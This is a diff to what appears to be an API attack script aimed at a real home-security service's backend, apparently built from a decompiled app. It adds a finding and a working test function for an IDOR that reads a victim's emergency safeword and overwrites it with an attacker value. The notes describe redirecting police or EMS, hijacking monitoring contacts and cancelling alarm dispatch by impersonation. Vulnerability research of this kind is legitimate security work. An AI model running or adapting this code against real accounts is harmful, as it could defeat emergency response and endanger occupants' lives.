@@ -309,6 +309,26 @@ FINDINGS = [
                   '(1) POST /v1/users/{victim_userId}/loginInfo {"email":"attacker@test.com","oldPassword":"<own_current_pass>"}; '
                   '200 = email changed (CRITICAL — partial ATO). '
                   '(2) POST with newPassword and own oldPassword; 200 = full credential hijack = CRITICAL.'),
+    Finding("F35", "CRITICAL", "Emergency Dispatch Manipulation IDOR — SafeWord + Address + Contacts via Location Settings",
+            "yoda", "/activation/{userId}/{sid}/location", "POST", None,
+            verified=False,
+            notes='APK: SimpliSafeRestService.java + LocationSettingsInfoRequest.java (classes14.dex). '
+                  'POST activation/{userId}/{sid}/location?country=US '
+                  'body: LocationSettingsInfoRequest{account, locationName, street1, street2, city, county, country, '
+                  'state, zip, residenceType, notes, numAdults, numChildren, safeWord, timeZone, '
+                  'primaryContacts: List<ContactPair>, secondaryContacts: List<ContactPair>, signature}. '
+                  'If userId+sid not JWT-bound: '
+                  '(1) Change safeWord to attacker-controlled value: victim calls monitoring to cancel alarm but '
+                  '    cannot provide correct safeWord -> dispatch proceeds against their wishes; '
+                  '    OR attacker knows safeWord -> can cancel dispatch by impersonating homeowner. '
+                  '(2) Change dispatch address (street1/city/state/zip) to wrong location: '
+                  '    police/fire/EMS sent to wrong address during real emergency -> life safety impact. '
+                  '(3) Inject attacker phone into primaryContacts: monitoring center calls attacker during alarm '
+                  '    -> attacker confirms/cancels dispatch, learns alarm details, impersonates homeowner. '
+                  '(4) Change numAdults/numChildren: affects monitoring center threat assessment. '
+                  'ALSO: GET /subscriptions/{sid}/settings?settingsType=GENERAL may expose current safeWord (F25-family). '
+                  'Test: POST /activation/{victim_userId}/{victim_sid}/location with modified safeWord; '
+                  '200 = CRITICAL.'),
 ]
 
 
@@ -984,6 +1004,35 @@ def test_monitoring_feature_idor(token, victim_location_id):
             _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
     else:
         _print("INFO", r.status_code, f"features/{victim_location_id}: {r.text[:100]}")
+
+
+def test_location_settings_idor(token, victim_uid, victim_sid, attacker_safeword="ABLATION-PROBE-1234"):
+    """F35: Change victim's emergency safeword + contacts via location settings IDOR."""
+    print(f"\n=== F35 — Location Settings IDOR (uid={victim_uid}, sid={victim_sid}) ===")
+    # Step 1: probe GET to read current safeWord (via subscriptions settings endpoint)
+    r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/settings?settingsType=GENERAL",
+            token=token)
+    if r and r.status_code == 200:
+        try:
+            data = r.json()
+            sw = data.get("settings", {}).get("safeWord") or data.get("safeWord")
+            _print("CRIT", 200, f"SAFEWORD READ sid={victim_sid} safeWord={sw}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:150]}")
+    else:
+        _print("INFO", r.status_code if r else 0,
+               f"settings read: {r.text[:80] if r else 'no response'}")
+    # Step 2: safe probe — only modifies safeWord, leaves other fields empty to minimize blast radius
+    body = {"safeWord": attacker_safeword}
+    r2 = post(f"{SERVICES['yoda']}/activation/{victim_uid}/{victim_sid}/location",
+              token=token, params={"country": "US"}, json=body)
+    if not r2:
+        print("  POST failed"); return
+    if r2.status_code in (200, 201, 204):
+        _print("CRIT", r2.status_code,
+               f"SAFEWORD CHANGED uid={victim_uid} sid={victim_sid} -> {attacker_safeword}")
+    else:
+        _print("INFO", r2.status_code, f"location update: {r2.text[:100]}")
 
 
 def test_webrtc_idor(token, victim_camera_uuid, victim_sid):
